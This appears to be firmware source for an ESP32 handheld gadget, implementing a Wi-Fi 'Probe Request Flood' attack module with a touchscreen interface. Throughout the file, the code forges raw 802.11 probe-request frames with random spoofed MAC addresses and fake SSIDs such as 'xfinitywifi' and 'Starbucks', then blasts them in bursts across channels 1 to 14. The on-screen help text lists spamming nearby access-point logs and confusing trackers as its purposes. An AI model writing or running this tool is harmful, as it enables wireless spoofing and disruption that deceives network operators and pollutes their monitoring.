/*
 * Probe Request Flood — see header.
 */

#include "probe_flood.h"
#include "wificonfig.h"
#include "utils.h"
#include "Touchscreen.h"

#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_random.h>
#include <string.h>

#define DARK_GRAY 0x4208

#define BTN_UP   6
#define BTN_DOWN 3

namespace ProbeFlood {

// 24-byte 802.11 mgmt header for Probe Request (type 0, subtype 4 => 0x40)
//   [0..1]  0x40 0x00 (FC: type=Mgmt, subtype=ProbeReq)
//   [2..3]  Duration
//   [4..9]  DA = broadcast FF
//   [10..15] SA = random spoofed STA
//   [16..21] BSSID = broadcast FF
//   [22..23] Seq/frag
static const uint8_t probe_req_hdr[24] = {
  0x40, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00
};

static const char* ssid_pool[] = {
  "FREE_WIFI", "xfinitywifi", "Starbucks", "iPhone",
  "AndroidAP", "Home", "Guest", "Office", "Pixel",
  "ATT", "Verizon", "TMobile", "Netgear", "Linksys",
  "TP-LINK", "BELKIN", "DIRECT-roku", "HP-Print",
  "Belkin54G", "default", "linksys", "NETGEAR",
  "MyWiFi", "CoffeeShop", "AirportWiFi", "HotelWiFi"
};
static const int ssid_pool_count = sizeof(ssid_pool) / sizeof(ssid_pool[0]);

static bool      attackActive = false;
static uint32_t  totalFrames  = 0;
static uint32_t  lastUiUpdate = 0;
static uint32_t  lastBtnMs    = 0;
static const uint32_t BTN_DEBOUNCE_MS = 200;
static uint8_t   hopChannel = 1;

static void sendProbeReq(uint8_t channel) {
  uint8_t frame[128];
  memcpy(frame, probe_req_hdr, 24);

  // Random spoofed STA MAC (locally administered, unicast)
  uint8_t src_mac[6];
  esp_fill_random(src_mac, 6);
  src_mac[0] = (src_mac[0] & 0xFE) | 0x02;
  for (int i = 0; i < 6; i++) frame[10 + i] = src_mac[i];

  // Pick base SSID
  uint8_t r;
  esp_fill_random(&r, 1);
  const char* base = ssid_pool[r % ssid_pool_count];

  // Build SSID: base + "_" + 3 random hex chars
  char ssid[33];
  uint8_t suffix[2];
  esp_fill_random(suffix, 2);
  int n = snprintf(ssid, sizeof(ssid), "%s_%02X%X",
                   base, suffix[0], suffix[1] & 0x0F);
  if (n < 1) n = 1;
  if (n > 32) n = 32;

  // Tagged params start at offset 24
  int off = 24;
  // SSID tag: id=0, len=n, then SSID bytes
  frame[off++] = 0x00;
  frame[off++] = (uint8_t)n;
  memcpy(frame + off, ssid, n);
  off += n;

  // Supported Rates tag: id=1, len=8, rates 1,2,5.5,11,6,9,12,18 Mbps
  static const uint8_t rates[10] = {
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24
  };
  memcpy(frame + off, rates, 10);
  off += 10;

  // Extended Supported Rates: id=50, len=4, rates 24,36,48,54 Mbps
  static const uint8_t ext_rates[6] = {
    0x32, 0x04, 0x30, 0x48, 0x60, 0x6C
  };
  memcpy(frame + off, ext_rates, 6);
  off += 6;

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
  esp_wifi_80211_tx(WIFI_IF_AP, frame, off, false);
  totalFrames++;
}

static void drawTopStatus() {
  tft.fillRect(35, 20, 205, 16, DARK_GRAY);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(attackActive ? TFT_RED : TFT_WHITE);
  tft.setCursor(35, 24);
  tft.printf("Probe Flood  ch%-2u  %u TX",
             (unsigned)hopChannel, (unsigned)totalFrames);
  tft.setTextColor(attackActive ? TFT_GREEN : TFT_DARKGREY);
  tft.setCursor(170, 24);
  tft.print(attackActive ? "ACTIVE" : "PAUSED");
}

static void drawInfoBlock() {
  tft.fillRect(0, 45, tft.width(), tft.height() - 60, TFT_BLACK);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW);
  tft.setCursor(2, 50);
  tft.print("Probe Request Flood");
  tft.setTextColor(TFT_DARKGREY);
  tft.setCursor(2, 65);
  tft.print("Broadcast probes w/ random SSIDs");
  tft.setCursor(2, 78);
  tft.print("Hops chans 1..14 round-robin");

  tft.setTextColor(TFT_WHITE);
  tft.setCursor(2, 100);
  tft.print("[UP]     Toggle ON/OFF");
  tft.setCursor(2, 115);
  tft.print("[SELECT] Exit");

  tft.setCursor(2, 140);
  tft.setTextColor(TFT_CYAN);
  tft.print("Why use this:");
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(2, 155);
  tft.print("- Spam nearby AP probe logs");
  tft.setCursor(2, 168);
  tft.print("- Hide your real client probes");
  tft.setCursor(2, 181);
  tft.print("- Confuse karma/PNL trackers");

  tft.setCursor(2, 210);
  tft.setTextColor(TFT_DARKGREY);
  tft.print("Sample SSIDs:");
  tft.setTextColor(TFT_WHITE);
  for (int i = 0; i < 6 && i < ssid_pool_count; i++) {
    tft.setCursor(2, 225 + (i / 2) * 14);
    tft.setCursor(2 + (i % 2) * 120, 225 + (i / 2) * 14);
    tft.print(ssid_pool[i]);
  }
}

void probeFloodSetup() {
  tft.fillScreen(TFT_BLACK);
  setupTouchscreen();

  attackActive = false;
  totalFrames = 0;
  hopChannel = 1;

  pcf.pinMode(BTN_UP, INPUT_PULLUP);

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();

  Serial.println("[ProbeFlood] ready, awaiting toggle");

  float v = readBatteryVoltage();
  drawStatusBar(v, false);
  tft.fillRect(0, 20, 240, 16, DARK_GRAY);
  drawInfoBlock();
  drawTopStatus();
  lastUiUpdate = millis();
}

void probeFloodLoop() {
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  uint32_t now = millis();
  if (now - lastBtnMs > BTN_DEBOUNCE_MS) {
    if (!pcf.digitalRead(BTN_UP)) {
      attackActive = !attackActive;
      Serial.printf("[ProbeFlood] %s\n", attackActive ? "STARTED" : "PAUSED");
      lastBtnMs = now;
      drawTopStatus();
    }
  }

  if (attackActive) {
    // Burst of 8 probes on the current channel, then hop
    for (int i = 0; i < 8; i++) sendProbeReq(hopChannel);
    hopChannel++;
    if (hopChannel > 14) hopChannel = 1;
  }

  if (now - lastUiUpdate > 300) {
    drawTopStatus();
    lastUiUpdate = now;
  }

  delay(attackActive ? 15 : 30);
}

}  // namespace ProbeFlood
